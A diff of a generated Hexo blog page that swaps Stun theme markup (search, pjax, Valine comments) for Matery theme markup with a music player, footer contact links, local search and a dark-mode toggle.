+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <a href="/about" target="_blank">Jlan</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
                     }
-                  });
-                  startIndex = index + word.length;
-                  !hasMatch && result.push({ index: index, word: word, weight: weight });
-                }
-                return result;
-              }
-              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
-              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
-            });
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
 
-            var hitTitle = titleHitSlice.length;
-            var hitContent = contentHitSlice.length;
-
-            if (hitTitle > 0 || hitContent > 0) {
-              isMatch = true;
-            }
-            if (isMatch) {
-              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
-                // 按照匹配文字的索引的递增顺序排序
-                hit.sort(function (left, right) {
-                  return left.index - right.index;
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
                 });
-              });
-              /**
-              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
-              * @param {String} text 原文本
-              * @param {Array} hitSlice 匹配项的索引信息
-              * @param {Number} start 开始索引
-              * @param {Number} end 结束索引
-              * @return {String}
-              */
-              function highlightKeyword (text, hitSlice, start, end) {
-                if (!text || !hitSlice || !hitSlice.length) {
-                  return;
-                }
-
-                var result = '';
-                var startIndex = start;
-                var endIndex = end;
-                hitSlice.forEach(function (hit) {
-                  if (hit.index < startIndex) {
-                    return;
-                  }
-
-                  var hitWordEnd = hit.index + hit.word.length;
-                  result += text.slice(startIndex, hit.index);
-                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
-                  startIndex = hitWordEnd;
-                });
-                result += text.slice(startIndex, endIndex);
-                return result;
-              }
-
-              var postData = {};
-              // 文章总的搜索权重
-              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
-              // 标记匹配关键词后的标题
-              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
-              // 标记匹配关键词后的内容
-              var postContent;
-              // 显示内容的长度
-              var SHOW_WORD_LENGTH = 200;
-              // 命中关键词前的字符显示长度
-              var SHOW_WORD_FRONT_LENGTH = 20;
-              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
-
-              // 截取匹配的第一个字符，前后共 200 个字符来显示
-              if (contentHitSlice.length > 0) {
-                var firstIndex = contentHitSlice[0].index;
-                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
-                var end = firstIndex + SHOW_WORD_END_LENGTH;
-                postContent = highlightKeyword(content, contentHitSlice, start, end);
-              } else { // 未匹配到内容，直接截取前 200 个字符来显示
-                postContent = content.slice(0, SHOW_WORD_LENGTH);
-              }
-              postData.title = postTitle;
-              postData.content = postContent;
-              postData.url = postURL;
-              postData.weight = postWeight;
-              matchPosts.push(postData);
             }
-          });
-        }
+        });
+    };
 
-        var resultInnerHtml = '';
-        if (matchPosts.length) {
-          // 按权重递增的顺序排序，使权重大的优先显示
-          matchPosts.sort(function (left, right) {
-            return right.weight - left.weight;
-          });
-          resultInnerHtml += '<ul>';
-          matchPosts.forEach(function (post) {
-            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
-            resultInnerHtml += post.title;
-            resultInnerHtml += '</a><div class="search-results-content">';
-            resultInnerHtml += post.content;
-            resultInnerHtml += '</div></li>';
-          });
-          resultInnerHtml += '</ul>';
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
         } else {
-          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
         }
-        $result.html(resultInnerHtml);
-      };
-      $input.on('input', searchPost);
-      $input.on('keyup', function (e) {
-        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
-          searchPost();
-        }
-      });
-    }
-  });
-}
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
 
-function closeSearch () {
-  $('body').css({ overflow: 'auto' });
-  $('.search-popup').css({ display: 'none' });
-  $('.search-mask').css({ display: 'none' });
-}
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
 
-window.addEventListener('DOMContentLoaded', function () {
-  Stun.utils.pjaxReloadLocalSearch = function () {
-    $('.header-nav-search').on('click', function (e) {
-      e.stopPropagation();
-      $('body').css('overflow', 'hidden');
-      $('.search-popup')
-        .velocity('stop')
-        .velocity('transition.expandIn', {
-          duration: 300,
-          complete: function () {
-            $('.search-popup input').focus();
-          }
-        });
-      $('.search-mask')
-        .velocity('stop')
-        .velocity('transition.fadeIn', {
-          duration: 300
-        });
+    
 
-      initSearch();
-    });
-    $('.search-mask, .search-close').on('click', function () {
-      closeSearch();
-    });
-    $(document).on('keydown', function (e) {
-      // Escape <=> 27
-      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
-        closeSearch();
-      }
-    });
-  };
+    
 
-  Stun.utils.pjaxReloadLocalSearch();
-}, false);
+    <!--腾讯兔小巢-->
+    
+    
 
-function safeOpenUrl(url) {
-  var newTab = window.open();
-  newTab.opener = null;
-  newTab.location = url;
-}
+    
 
-function extSearch(engine) {
-  var engines = {
-    google: 'https://www.google.com/search?q=',
-    bing: 'https://cn.bing.com/search?q=',
-    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
-  };
-  var host = window.location.host;
-  var query = $('.search-input input').val().toLowerCase().trim();
-  var uri = engines[engine] + query + ' site:' + host;
+    
 
-  if (query) {
-    safeOpenUrl(uri);
-  } else {
-    Stun.utils.popAlert('warning', '请输入字符');
-  }
-}
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
 
-var assistSearchList = window.CONFIG.assistSearch;
+</body>
 
-if (Array.isArray(assistSearchList)) {
-  assistSearchList.forEach(function (name) {
-    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
-      extSearch(name);
-    }, false);
-  });
-}</script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
-  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
-  // 加载进度条的计时器
-  var loadingTimer = null;
-
-  // 重置页面 Y 方向上的滚动偏移量
-  document.addEventListener('pjax:send', function () {
-    $('.header-nav-menu').removeClass('show');
-    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
-      $('html').velocity('scroll', {
-        duration: 500,
-        offset: $('#header').height(),
-        easing: 'easeInOutCubic'
-      });
-    }
-
-    var loadingBarWidth = 20;
-    var MAX_LOADING_WIDTH = 95;
-
-    $('.loading-bar').addClass('loading');
-    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
-    clearInterval(loadingTimer);
-    loadingTimer = setInterval(function () {
-      loadingBarWidth += 3;
-      if (loadingBarWidth > MAX_LOADING_WIDTH) {
-        loadingBarWidth = MAX_LOADING_WIDTH;
-      }
-      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
-    }, 500);
-  }, false);
-
-  window.addEventListener('pjax:complete', function () {
-    clearInterval(loadingTimer);
-    $('.loading-bar__progress').css('width', '100%');
-    $('.loading-bar').removeClass('loading');
-    setTimeout(function () {
-      $('.loading-bar__progress').css('width', '0');
-    }, 400);
-    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
-      $(this).remove();
-    });
-    $('script[data-pjax], #pjax-reload script').each(function () {
-      $(this).parent().append($(this).remove());
-    });
-
-    if (Stun.utils.pjaxReloadBoot) {
-      Stun.utils.pjaxReloadBoot();
-    }
-    if (Stun.utils.pjaxReloadScroll) {
-      Stun.utils.pjaxReloadScroll();
-    }
-    if (Stun.utils.pjaxReloadSidebar) {
-      Stun.utils.pjaxReloadSidebar();
-    }
-    if (false) {
-      if (Stun.utils.pjaxReloadHeader) {
-        Stun.utils.pjaxReloadHeader();
-      }
-      if (Stun.utils.pjaxReloadScrollIcon) {
-        Stun.utils.pjaxReloadScrollIcon();
-      }
-      if (Stun.utils.pjaxReloadLocalSearch) {
-        Stun.utils.pjaxReloadLocalSearch();
-      }
-    }
-  }, false);
-}, false);</script><div id="pjax-reload"><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script></div><script src="https://cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script data-pjax="">function loadValine () {
-  var GUEST_INFO = ['nick', 'mail', 'link'];
-  var guest_info = 'nick,mail,link';
-
-  guest_info = guest_info.split(',').filter(function(item) {
-    return GUEST_INFO.indexOf(item) > -1;
-  });
-  new Valine({
-    el: '#valine-container',
-    appId: 'PRycUaQbxE5mebmnKTjtaRJg-gzGzoHsz',
-    appKey: 'jGyP9zr05MTuqHpWaIkgYW4h',
-    notify: true,
-    verify: true,
-    placeholder: '写点什么吧',
-    avatar: 'mp',
-    meta: guest_info,
-    pageSize: '10' || 10,
-    visitor: true,
-    recordIP: true,
-    lang: 'zh-cn,en' || 'zh-cn',
-    path: window.location.pathname
-  });
-}
-
-if (true) {
-  loadValine();
-} else {
-  window.addEventListener('DOMContentLoaded', loadValine, false);
-}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
+</html>
